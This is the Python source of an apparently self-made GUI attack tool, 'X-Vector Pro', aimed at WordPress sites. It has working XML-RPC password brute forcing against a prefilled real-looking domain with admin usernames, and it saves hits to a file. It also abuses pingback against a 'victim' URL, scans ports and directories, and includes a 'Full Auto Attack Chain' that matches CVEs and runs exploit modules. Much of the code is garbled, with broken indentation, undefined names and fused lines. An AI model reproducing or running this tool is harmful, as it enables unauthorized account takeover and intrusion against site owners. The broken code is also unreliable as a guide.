from tkinter import Toplevel
import time
from urllib.parse import urljoin
import re
import xmlrpc.client
from concurrent.futures import ThreadPoolExecutor
import customtkinter as ctk
from tkinter import filedialog, messagebox
import json
import os
import requests
import socket
import tldextract
from datetime import datetime
import importlib.util
import os
import customtkinter as ctk
from tkinter import filedialog, messagebox
import threading
import socket
from queue import Queue
import json
# === Splash ===
splash = ctk.CTk()
splash.geometry("400x200")
splash.title("X-Vector Pro")
ctk.CTkLabel(splash, text="Initializing X-Vector Pro...", font=("Arial", 18)).pack(pady=40)
ctk.CTkLabel(splash, text="Silent. Adaptive. Lethal.", font=("Courier", 12)).pack()
splash.after(2000, splash.destroy)  # Show for 2 sec
splash.mainloop()

from datetime import datetime
def load_settings():
    try:
        with open("config.json", "r") as f:
            return json.load(f)
    except:
        return {
            "use_proxy": False,
            "delay_seconds": 0.5,
            "random_user_agent": True,
            "default_wordlist": ""
        }

def save_settings_to_file():
    config = {
        "use_proxy": proxy_toggle.get(),
        "delay_seconds": delay_slider.get(),
        "random_user_agent": ua_toggle.get(),
        "default_wordlist": wordlist_path_entry.get().strip()
    }
    with open("config.json", "w") as f:
        json.dump(config, f, indent=2)
    log_to_central("[+] Settings saved to config.json")

settings = load_settings()
def log_to_central(msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    logs_output.insert("end", f"[{timestamp}] {msg}\n")
    logs_output.see("end")  # auto-scroll
    exploit_output.insert("end", "some message\n")
log_to_central("some message")
import importlib.util
import os
import customtkinter as ctk
from tkinter import filedialog, messagebox
import threading
import socket
from queue import Queue
import json
matched_exploits = []
# === Setup ===
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

app = ctk.CTk()
app.geometry("900x650")
app.title("X-Vector Pro | Silent. Adaptive. Lethal.")

# === Tabbed Layout ===
tabs = ctk.CTkTabview(app, width=880, height=620)
tabs.pack(padx=10, pady=10)

# === Add Tabs ===
recon_tab = tabs.add("Recon")
scanner_tab = tabs.add("Scanner")
brute_tab = tabs.add("Brute Force")
exploit_tab = tabs.add("Exploits")
logs_tab = tabs.add("Logs")
settings_tab = tabs.add("Settings")

# =====================
# === BRUTE FORCE TAB
# =====================
def run_brute_force():
    target = target_entry.get().strip()
    usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines()]
    wordlist_path = wordlist_entry.get().strip()

    if not target or not usernames or not wordlist_path:
        messagebox.showerror("Error", "Please fill all fields.")
        return

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        messagebox.showerror("File Error", f"Cannot read password list:\n{e}")
        return

    log_box.insert("end", "[*] Starting brute force...\n")
    server = xmlrpc.client.ServerProxy(target)

    for user in usernames:
        log_box.insert("end", f"\n[*] Trying user: {user}\n")
        for password in passwords:
            try:
                resp = server.wp.getUsersBlogs(user, password)
                if resp:
                    hit = f"[+] HIT: {user}:{password}\n"
                    log_box.insert("end", hit)
                    with open("hits.txt", "a") as hit_file:
                        hit_file.write(f"{user}:{password}\n")
                    break
            except xmlrpc.client.Fault:
                pass
            except Exception as e:
                log_box.insert("end", f"[-] Error with {user}: {e}\n")
                break
    log_box.insert("end", "[*] Brute force finished.\n")

def browse_wordlist():
    path = filedialog.askopenfilename()
    if path:
        wordlist_entry.delete(0, "end")
        wordlist_entry.insert(0, path)

import xmlrpc.client  # moved up for logic reuse

ctk.CTkLabel(brute_tab, text="Target URL (https://example.com/xmlrpc.php)").pack(pady=5)
target_entry = ctk.CTkEntry(brute_tab, width=700)
target_entry.insert(0, "https://www.zayachek.com/xmlrpc.php")
target_entry.pack()

ctk.CTkLabel(brute_tab, text="Usernames (one per line)").pack(pady=5)
usernames_box = ctk.CTkTextbox(brute_tab, height=100, width=700)
usernames_box.insert("0.0", "admin\neditor\nauthor")
usernames_box.pack()

ctk.CTkLabel(brute_tab, text="Password List").pack(pady=5)
wordlist_frame = ctk.CTkFrame(brute_tab)
wordlist_frame.pack()
wordlist_entry = ctk.CTkEntry(wordlist_frame, width=500)
wordlist_entry.pack(side="left", padx=5)
browse_btn = ctk.CTkButton(wordlist_frame, text="Browse", command=browse_wordlist)
browse_btn.pack(side="left")

start_btn = ctk.CTkButton(brute_tab, text="Start Brute Force", fg_color="green", hover_color="darkgreen",
                          command=lambda: threading.Thread(target=run_brute_force).start())
start_btn.pack(pady=10)

log_box = ctk.CTkTextbox(brute_tab, height=200, width=700)
log_box.pack()

# ==========================
# === RECON TAB
# ==========================
import socket
import requests
import tldextract

def run_recon():
    target = recon_url_entry.get().strip()
    if not target:
        messagebox.showerror("Error", "Enter a target URL.")
        return

    recon_output.delete("0.0", "end")
    recon_output.insert("end", f"[*] Starting recon on {target}...\n")

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (X-Vector Recon Bot)"
        }
        r = requests.get(target, headers=headers, timeout=10)

        # Server Headers
        recon_output.insert("end", "\n--- Headers ---\n")
        for key, value in r.headers.items():
            recon_output.insert("end", f"{key}: {value}\n")

        # Title
        if "<title>" in r.text:
            title = r.text.split("<title>")[1].split("</title>")[0].strip()
            recon_output.insert("end", f"\n[*] Title: {title}\n")

        # CMS Detection
        recon_output.insert("end", "\n--- CMS Detection ---\n")
        if "wp-content" in r.text or "/wp-login.php" in r.text:
            recon_output.insert("end", "[+] WordPress Detected\n")
        elif "Joomla!" in r.text:
            recon_output.insert("end", "[+] Joomla Detected\n")
        elif "Drupal" in r.text:
            recon_output.insert("end", "[+] Drupal Detected\n")
        else:
            recon_output.insert("end", "[-] CMS Not Identified\n")

        # IP + Domain Info
        extracted = tldextract.extract(target)
        base_domain = ".".join(part for part in [extracted.domain, extracted.suffix] if part)
        ip = requests.get(f"https://dns.google/resolve?name={base_domain}&type=A").json()
        if "Answer" in ip:
            ip_addr = ip["Answer"][0]["data"]
            recon_output.insert("end", f"\n[*] IP Address: {ip_addr}\n")

    except Exception as e:
        recon_output.insert("end", f"[!] Recon failed: {e}\n")
def subdomain_scan():
    domain = recon_url_entry.get().strip()
    if not domain:
        messagebox.showerror("Error", "Enter a target domain.")
        return

    recon_output.insert("end", "\n[*] Starting subdomain scan...\n")

    wordlist = [
        "admin", "dev", "mail", "webmail", "test", "vpn", "portal",
        "beta", "staging", "api", "cpanel", "dashboard", "internal"
    ]

    # extract clean domain
    extracted = tldextract.extract(domain)
    base_domain = ".".join(part for part in [extracted.domain, extracted.suffix] if part)

    found = 0
    for sub in wordlist:
        subdomain = f"{sub}.{base_domain}"
        try:
            ip = socket.gethostbyname(subdomain)
            recon_output.insert("end", f"[+] Found: {subdomain} -> {ip}\n")
            found += 1
        except socket.gaierror:
            pass  # not resolved

    if found == 0:
        recon_output.insert("end", "[-] No subdomains found.\n")
    else:
        recon_output.insert("end", f"[*] Subdomain scan complete: {found} found\n")
# === Recon UI Layout ===
ctk.CTkLabel(recon_tab, text="Target URL (https://example.com)").pack(pady=5)
recon_url_entry = ctk.CTkEntry(recon_tab, width=700)
recon_url_entry.pack()
ctk.CTkButton(recon_tab, text="Scan Subdomains", command=lambda: threading.Thread(target=subdomain_scan).start()).pack(pady=5)
ctk.CTkButton(recon_tab, text="Run Recon", command=lambda: threading.Thread(target=run_recon).start()).pack(pady=10)

recon_output = ctk.CTkTextbox(recon_tab, height=400, width=800)
recon_output.pack()
# === Start GUI ===
app.mainloop()
# ==================
# ===  PORT SCAN TAB
# ==================
def run_port_scan():
    target = scanner_target_entry.get().strip()
    if not target:
        messagebox.showerror("Error", "Enter a valid target IP or domain.")
        return

    scanner_output.delete("0.0", "end")
    scanner_output.insert("end", f"[*] Starting port scan on {target}...\n")
ctk.CTkButton(scanner_tab, text="Start Dir Scan", command=lambda: threading.Thread(target=run_dir_scan).start()).pack(pady=5)
    def scan_worker():
        while not q.empty():
            port = q.get()
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    result = s.connect_ex((target, port))
                    if result == 0:
                        scanner_output.insert("end", f"[+] Port {port} is open\n")
            except Exception as e:
                scanner_output.insert("end", f"[-] Error on port {port}: {e}\n")
            q.task_done()

    # Common 100 ports
    top_ports = [
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723,
        3306, 3389, 5900, 8080, 8443, 8888, 8000, 8081, 8880, 10000, 9200, 5432,
        389, 137, 138, 139, 2049, 1521, 465, 993, 995, 1025, 49152, 49153
    ]

    q = Queue()
    for port in top_ports:
        q.put(port)

    thread_count = 100
    for _ in range(thread_count):
        t = threading.Thread(target=scan_worker, daemon=True)
        t.start()

    q.join()
    scanner_output.insert("end", "[*] Port scan finished.\n")
    ctk.CTkLabel(scanner_tab, text="Target IP or Domain").pack(pady=5)
scanner_target_entry = ctk.CTkEntry(scanner_tab, width=500)
scanner_target_entry.pack()

ctk.CTkButton(scanner_tab, text="Start Port Scan", command=lambda: threading.Thread(target=run_port_scan).start()).pack(pady=10)

scanner_output = ctk.CTkTextbox(scanner_tab, height=400, width=800)
scanner_output.pack()

# =================
# === Dirbuster TAB
# ==================

def run_dir_scan():
    url = scanner_target_entry.get().strip().rstrip("/")
    if not url.startswith("http"):
        messagebox.showerror("Error", "Use full URL (http/https).")
        return

    scanner_output.insert("end", "\n[*] Starting directory scan...\n")

    wordlist = [
        "admin", "login", "dashboard", "config", "backup", "wp-admin",
        "uploads", "includes", "panel", "cpanel", "private", "hidden", "db", "phpmyadmin"
    ]

    def scan_path(path):
        full_url = f"{url}/{path}"
        try:
            r = requests.get(full_url, timeout=5)
            if r.status_code in [200, 301, 403]:
                scanner_output.insert("end", f"[+] {full_url} [{r.status_code}]\n")
        except Exception:
            pass

    threads = []
    for path in wordlist:
        t = threading.Thread(target=scan_path, args=(path,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    scanner_output.insert("end", "[*] Dir scan finished.\n")

# ===============
# === Exploit TAB
# ===============
from urllib.parse import urljoin
import re
import xmlrpc.client
def run_pingback_exploit():
    xmlrpc_url = exploit_target_entry.get().strip()
    victim_url = exploit_victim_entry.get().strip()

    if not xmlrpc_url or not victim_url:
        messagebox.showerror("Error", "Fill in both target and victim URLs.")
        return

    exploit_output.delete("0.0", "end")
    exploit_output.insert("end", f"[*] Sending pingback from {xmlrpc_url} to {victim_url}\n")

    try:
        proxy = xmlrpc.client.ServerProxy(xmlrpc_url)
        result = proxy.pingback.ping(victim_url, xmlrpc_url)
        exploit_output.insert("end", f"[+] Pingback response: {result}\n")
    except xmlrpc.client.Fault as fault:
        exploit_output.insert("end", f"[-] Fault: {fault.faultString}\n")
    except Exception as e:
        exploit_output.insert("end", f"[!] Error: {e}\n")
ctk.CTkLabel(exploit_tab, text="Target XML-RPC URL").pack(pady=5)
exploit_target_entry = ctk.CTkEntry(exploit_tab, width=700)
exploit_target_entry.insert(0, "https://example.com/xmlrpc.php")
exploit_target_entry.pack()

ctk.CTkLabel(exploit_tab, text="Victim URL to Ping").pack(pady=5)
exploit_victim_entry = ctk.CTkEntry(exploit_tab, width=700)
exploit_victim_entry.insert(0, "http://victim.com")
exploit_victim_entry.pack()

ctk.CTkButton(exploit_tab, text="Launch Pingback Exploit",
              command=lambda: threading.Thread(target=run_pingback_exploit).start()).pack(pady=10)

exploit_output = ctk.CTkTextbox(exploit_tab, height=300, width=800)
exploit_output.pack()
def run_wp_asset_enum():
    url = exploit_target_entry.get().strip()
    if not url.startswith("http"):
        messagebox.showerror("Error", "Enter a valid WordPress URL (with http/https).")
        return

    exploit_output.delete("0.0", "end")
    exploit_output.insert("end", f"[*] Scanning {url} for plugins and themes...\n")

    try:
        r = requests.get(url, timeout=10)
        html = r.text

        # Detect Plugins
        plugin_matches = re.findall(r'/wp-content/plugins/([a-zA-Z0-9-_]+)(/[^"\']*)?', html)
        plugin_set = {match[0] for match in plugin_matches}

        # Detect Themes
        theme_matches = re.findall(r'/wp-content/themes/([a-zA-Z0-9-_]+)(/[^"\']*)?', html)
        theme_set = {match[0] for match in theme_matches}

        if plugin_set:
            exploit_output.insert("end", "\n[+] Plugins Found:\n")
            for plugin in plugin_set:
                version = re.search(rf'/wp-content/plugins/{plugin}.*?[?&]ver=([0-9\.]+)', html)
                if version:
                    exploit_output.insert("end", f" - {plugin} (ver {version.group(1)})\n")
                else:
                    exploit_output.insert("end", f" - {plugin}\n")
        else:
            exploit_output.insert("end", "[-] No plugins found.\n")

        if theme_set:
            exploit_output.insert("end", "\n[+] Themes Found:\n")
            for theme in theme_set:
                version = re.search(rf'/wp-content/themes/{theme}.*?[?&]ver=([0-9\.]+)', html)
                if version:
                    exploit_output.insert("end", f" - {theme} (ver {version.group(1)})\n")
                else:
                    exploit_output.insert("end", f" - {theme}\n")
        else:
            exploit_output.insert("end", "[-] No themes found.\n")

    except Exception as e:
        exploit_output.insert("end", f"[!] Failed to scan: {e}\n")
        ctk.CTkButton(exploit_tab, text="Scan Plugins & Themes",
              command=lambda: threading.Thread(target=run_wp_asset_enum).start()).pack(pady=5)
        def match_vulnerabilities():
    try:
        with open("cve_db.json", "r") as f:
            vuln_db = json.load(f)
    except Exception as e:
        exploit_output.insert("end", f"[!] Could not load CVE DB: {e}\n")
        return

    exploit_output.insert("end", "\n[*] Matching detected assets against CVE DB...\n")

    url = exploit_target_entry.get().strip()
    try:
        r = requests.get(url, timeout=10)
        html = r.text
    except Exception as e:
        exploit_output.insert("end", f"[!] Failed to fetch target HTML: {e}\n")
        return

    # Match Plugins
    for plugin in vuln_db:
        if f"/wp-content/plugins/{plugin}" in html:
            version_match = re.search(rf'/wp-content/plugins/{plugin}.*?[?&]ver=([0-9\.]+)', html)
            if version_match:
                version = version_match.group(1)
                if version in vuln_db[plugin]:
                    vuln = vuln_db[plugin][version]
                    exploit_output.insert("end", f"[+] {plugin} v{version} is VULNERABLE!\n")
                    exploit_output.insert("end", f"    - {vuln['cve']}: {vuln['desc']}\n")
                else:
                    exploit_output.insert("end", f"[-] {plugin} v{version} found — no vuln match.\n")
            else:
                exploit_output.insert("end", f"[*] {plugin} detected — version unknown.\n")
ctk.CTkButton(exploit_tab, text="Check for CVEs",
              command=lambda: threading.Thread(target=match_vulnerabilities).start()).pack(pady=5)
    # Match Themes — can expand the same way
def run_selected_exploit():
    selected_exploit = exploit_selector.get()
    target_url = exploit_target_entry.get().strip()

    if not selected_exploit or selected_exploit == "None found":
        messagebox.showerror("Error", "No exploit selected.")
        return

    module_path = os.path.join("exploits", f"{selected_exploit}.py")
    if not os.path.exists(module_path):
        exploit_output.insert("end", f"[!] Exploit module not found: {selected_exploit}\n")
        return

    try:
        spec = importlib.util.spec_from_file_location(selected_exploit, module_path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        result = module.run(target_url)
        exploit_output.insert("end", f"[+] Exploit result:\n{result}\n")
    except Exception as e:
        # Populate exploit selector (GUI dropdown)
    global matched_exploits
    matched_exploits = []

    for plugin in vuln_db:
        if f"/wp-content/plugins/{plugin}" in html:
            version_match = re.search(rf'/wp-content/plugins/{plugin}.*?[?&]ver=([0-9\.]+)', html)
            if version_match:
                version = version_match.group(1)
                if version in vuln_db[plugin]:
                    exploit = vuln_db[plugin][version]["exploit"]
                    matched_exploits.append(exploit)

    if matched_exploits:
        exploit_selector.configure(values=matched_exploits)
        exploit_selector.set(matched_exploits[0])
    else:
        exploit_selector.set("None found")
        exploit_output.insert("end", f"[!] Exploit failed: {e}\n")
ctk.CTkLabel(exploit_tab, text="Available Exploits").pack(pady=5)
exploit_selector = ctk.CTkOptionMenu(exploit_tab, values=["None found"])
exploit_selector.pack()

ctk.CTkButton(exploit_tab, text="Run Selected Exploit",
              command=lambda: threading.Thread(target=run_selected_exploit).start()).pack(pady=10)
def run_all_exploits():
    target_url = exploit_target_entry.get().strip()

    if not matched_exploits:
        messagebox.showwarning("No Exploits", "No matched exploits to run.")
        return

    exploit_output.insert("end", f"\n[*] Running {len(matched_exploits)} exploit(s) on {target_url}...\n")

    for exploit_name in matched_exploits:
        module_path = os.path.join("exploits", f"{exploit_name}.py")
        if not os.path.exists(module_path):
            exploit_output.insert("end", f"[!] Missing module: {exploit_name}\n")
            continue

        try:
            spec = importlib.util.spec_from_file_location(exploit_name, module_path)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
            result = module.run(target_url)
            exploit_output.insert("end", f"[+] {exploit_name} result:\n{result}\n")
        except Exception as e:
            exploit_output.insert("end", f"[!] {exploit_name} failed: {e}\n")

    exploit_output.insert("end", "[*] All exploits processed.\n")
    ctk.CTkButton(exploit_tab, text="Run All Exploits",
              fg_color="red", hover_color="darkred",
              command=lambda: threading.Thread(target=run_all_exploits).start()).pack(pady=10)
# ============
# === Logs TAB
# =============
logs_output = ctk.CTkTextbox(logs_tab, height=450, width=800)
logs_output.pack(pady=10)
def export_html_report():
    try:
        html = logs_output.get("1.0", "end")
        formatted = "<br>".join(html.splitlines())
        with open("xvector_report.html", "w") as f:
            f.write(f"<html><body><h2>X-Vector Pro Report</h2><pre>{formatted}</pre></body></html>")
        log_to_central("[+] Exported HTML report: xvector_report.html")
    except Exception as e:
        log_to_central(f"[!] Report export failed: {e}")

ctk.CTkButton(logs_buttons, text="Export HTML", command=export_html_report).pack(side="left", padx=10)
def save_logs():
    try:
        with open("xvector_log.txt", "w") as f:
            f.write(logs_output.get("1.0", "end"))
        log_to_central("[+] Logs saved to xvector_log.txt")
    except Exception as e:
        log_to_central(f"[!] Error saving logs: {e}")

def clear_logs():
    logs_output.delete("0.0", "end")

logs_buttons = ctk.CTkFrame(logs_tab)
logs_buttons.pack(pady=10)

ctk.CTkButton(logs_buttons, text="Save Logs", command=save_logs).pack(side="left", padx=10)
ctk.CTkButton(logs_buttons, text="Clear Logs", command=clear_logs).pack(side="left", padx=10)
# ================
# === Settings TAB
# ================
# Proxy Toggle
proxy_toggle = ctk.CTkCheckBox(settings_tab, text="Use Proxy (future support)", onvalue=True, offvalue=False)
proxy_toggle.pack(pady=5)
proxy_toggle.select() if settings["use_proxy"] else proxy_toggle.deselect()

# Delay Slider
ctk.CTkLabel(settings_tab, text="Request Delay (seconds)").pack()
delay_slider = ctk.CTkSlider(settings_tab, from_=0.0, to=5.0, number_of_steps=50)
delay_slider.set(settings["delay_seconds"])
delay_slider.pack(pady=5)

# User-Agent Toggle
ua_toggle = ctk.CTkCheckBox(settings_tab, text="Randomize User-Agent", onvalue=True, offvalue=False)
ua_toggle.pack(pady=5)
ua_toggle.select() if settings["random_user_agent"] else ua_toggle.deselect()

# Default Wordlist
ctk.CTkLabel(settings_tab, text="Default Wordlist Path").pack(pady=5)
wordlist_path_entry = ctk.CTkEntry(settings_tab, width=500)
wordlist_path_entry.insert(0, settings["default_wordlist"])
wordlist_path_entry.pack()

def browse_default_wordlist():
    path = filedialog.askopenfilename()
    if path:
        wordlist_path_entry.delete(0, "end")
        wordlist_path_entry.insert(0, path)
def run_full_auto_mode():
    url = fullauto_url_entry.get().strip()
    if not url.startswith("http"):
        fullauto_log("[!] Invalid URL. Use full http/https format.")
        return

    fullauto_log("[*] Starting full auto mode...")

    # Recon Phase
    try:
        fullauto_log("[*] Running Recon...")
        r = requests.get(url, timeout=10)
        if "<title>" in r.text:
            title = r.text.split("<title>")[1].split("</title>")[0].strip()
            fullauto_log(f"    [+] Site title: {title}")
    except Exception as e:
        fullauto_log(f"[!] Recon failed: {e}")

    # Port Scan Phase
    try:
        fullauto_log("[*] Running Port Scan...")
        target_host = tldextract.extract(url).registered_domain
        ip = socket.gethostbyname(target_host)
        for port in [21, 22, 80, 443, 3306]:
            try:
                s = socket.socket()
                s.settimeout(0.3)
                if s.connect_ex((ip, port)) == 0:
                    fullauto_log(f"    [+] Open port: {port}")
                s.close()
            except:
                continue
    except Exception as e:
        fullauto_log(f"[!] Port scan failed: {e}")

    # Dir Scan Phase (simplified)
    try:
        fullauto_log("[*] Running Dir Scan...")
        common_dirs = ["admin", "login", "wp-admin", "config"]
        for d in common_dirs:
            check = f"{url.rstrip('/')}/{d}"
            try:
                resp = requests.get(check, timeout=3)
                if resp.status_code in [200, 301, 403]:
                    fullauto_log(f"    [+] Found: {check} ({resp.status_code})")
            except:
                continue
    except Exception as e:
        fullauto_log(f"[!] Dir scan failed: {e}")

    # Plugin/Theme Detection + CVE Matching
    try:
        fullauto_log("[*] Checking for plugins/themes...")
        r = requests.get(url, timeout=10)
        html = r.text
        found_plugins = []
        with open("cve_db.json") as f:
            vuln_db = json.load(f)

        for plugin in vuln_db:
            if f"/wp-content/plugins/{plugin}" in html:
                version_match = re.search(rf'/wp-content/plugins/{plugin}.*?[?&]ver=([0-9\.]+)', html)
                if version_match:
                    version = version_match.group(1)
                    if version in vuln_db[plugin]:
                        fullauto_log(f"    [!!] {plugin} v{version} is vulnerable!")
                        fullauto_log(f"         → {vuln_db[plugin][version]['desc']}")
                        found_plugins.append(vuln_db[plugin][version]['exploit'])
        if not found_plugins:
            fullauto_log("    [-] No known vulnerable plugins found.")
    except Exception as e:
        fullauto_log(f"[!] Plugin check failed: {e}")
        return

    # Exploit Chain
    for exploit in found_plugins:
        fullauto_log(f"[*] Launching exploit: {exploit}")
        try:
            path = os.path.join("exploits", f"{exploit}.py")
            spec = importlib.util.spec_from_file_location(exploit, path)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            result = mod.run(url)
            fullauto_log(f"    [+] Result: {result}")
        except Exception as e:
            fullauto_log(f"    [!] Exploit failed: {e}")

    fullauto_log("[*] Full auto mode completed.")
ctk.CTkButton(settings_tab, text="Browse", command=browse_default_wordlist).pack(pady=5)

# Save Settings
ctk.CTkButton(settings_tab, text="Save Settings", command=save_settings_to_file).pack(pady=10)


fullauto_tab = tabs.add("Full Auto")
ctk.CTkLabel(fullauto_tab, text="Target URL (e.g. https://example.com)").pack(pady=5)
fullauto_url_entry = ctk.CTkEntry(fullauto_tab, width=700)
fullauto_url_entry.pack()

ctk.CTkButton(fullauto_tab, text="Launch Full Auto Attack Chain",
              fg_color="orange", hover_color="darkorange",
              command=lambda: threading.Thread(target=run_full_auto_mode).start()).pack(pady=20)

fullauto_output = ctk.CTkTextbox(fullauto_tab, height=400, width=800)
fullauto_output.pack(pady=10)

def fullauto_log(msg):
    fullauto_output.insert("end", msg + "\n")
    fullauto_output.see("end")
    log_to_central(msg)
ctk.CTkLabel(findings_tab, text="Saved Findings").pack(pady=5)

findings_listbox = ctk.CTkTextbox(findings_tab, height=150, width=600)
findings_listbox.pack(pady=5)def load_findings():
    findings_listbox.delete("0.0", "end")
    global findings_list
    findings_list = []

    if not current_project_path:
        findings_listbox.insert("end", "[!] No project loaded.\n")
        return

    path = os.path.join(current_project_path, "findings.json")
    if not os.path.exists(path):
        findings_listbox.insert("end", "[!] No findings yet.\n")
        return

    try:
        with open(path, "r") as f:
            findings_list = json.load(f)

        for i, fnd in enumerate(findings_list):
            findings_listbox.insert("end", f"{i+1}. [{fnd['status']}] {fnd['title']} ({fnd['severity']})\n")

    except Exception as e:
        findings_listbox.insert("end", f"[!] Error loading findings: {e}\n")def delete_last_finding():
    if not findings_list:
        return
    findings_list.pop()
    try:
        with open(os.path.join(current_project_path, "findings.json"), "w") as f:
            json.dump(findings_list, f, indent=2)
        log_to_central("[+] Last finding deleted.")
        load_findings()
    except Exception as e:
        messagebox.showerror("Error", f"Delete failed: {e}")

ctk.CTkButton(findings_tab, text="Delete Last Finding", command=delete_last_finding).pack(pady=5)def load_findings():
    findings_listbox.delete(0, tk.END)
    global findings_list
    findings_list = []

    if not current_project_path:
        findings_listbox.insert(tk.END, "[!] No project loaded.")
        return

    path = os.path.join(current_project_path, "findings.json")
    if not os.path.exists(path):
        findings_listbox.insert(tk.END, "[!] No findings yet.")
        return

    try:
        with open(path, "r") as f:
            findings_list = json.load(f)

        for i, fnd in enumerate(findings_list):
            findings_listbox.insert(tk.END, f"{i+1}. [{fnd['status']}] {fnd['title']} ({fnd['severity']})")

    except Exception as e:
        findings_listbox.insert(tk.END, f"[!] Error loading findings: {e}")def on_finding_select(event):
    if not findings_listbox.curselection():
        return
    index = findings_listbox.curselection()[0]
    finding = findings_list[index]

    # Load into form
    title_entry.delete(0, tk.END)
    title_entry.insert(0, finding["title"])

    cve_entry.delete(0, tk.END)
    cve_entry.insert(0, finding["cve"])

    severity_menu.set(finding["severity"])
    url_entry.delete(0, tk.END)
    url_entry.insert(0, finding["url"])

    desc_box.delete("1.0", tk.END)
    desc_box.insert("1.0", finding["description"])

    poc_box.delete("1.0", tk.END)
    poc_box.insert("1.0", finding["poc"])

    rec_box.delete("1.0", tk.END)
    rec_box.insert("1.0", finding["recommendation"])

    status_menu.set(finding["status"])

    global selected_finding_index
    selected_finding_index = index

findings_listbox.bind("<<ListboxSelect>>", on_finding_select)
selected_finding_index = Nonedef update_finding():
    if selected_finding_index is None:
        messagebox.showerror("Error", "No finding selected to update.")
        return

    updated = {
        "title": title_entry.get().strip(),
        "cve": cve_entry.get().strip(),
        "severity": severity_menu.get(),
        "url": url_entry.get().strip(),
        "description": desc_box.get("1.0", "end").strip(),
        "poc": poc_box.get("1.0", "end").strip(),
        "recommendation": rec_box.get("1.0", "end").strip(),
        "status": status_menu.get()
    }

    findings_list[selected_finding_index] = updated

    try:
        with open(os.path.join(current_project_path, "findings.json"), "w") as f:
            json.dump(findings_list, f, indent=2)
        log_to_central(f"[~] Updated finding: {updated['title']}")
        load_findings()
    except Exception as e:
        messagebox.showerror("Error", f"Could not update finding: {e}")

ctk.CTkButton(findings_tab, text="Update Selected Finding", command=update_finding).pack(pady=5)
